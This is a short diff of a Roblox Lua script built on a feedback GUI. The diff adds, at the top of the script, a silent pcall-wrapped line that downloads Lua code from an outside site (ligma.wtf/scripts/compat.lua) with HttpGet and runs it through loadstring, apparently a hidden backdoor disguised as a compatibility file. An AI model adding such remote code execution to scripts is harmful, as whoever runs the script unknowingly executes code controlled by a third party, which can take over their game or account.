@@ -1,5 +1,5 @@
 -- built on a feedback gui LMAO
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 local FeedbackGui = Instance.new("ScreenGui")
 local Button = Instance.new("TextButton")
 local FeedbackMain = Instance.new("Frame")
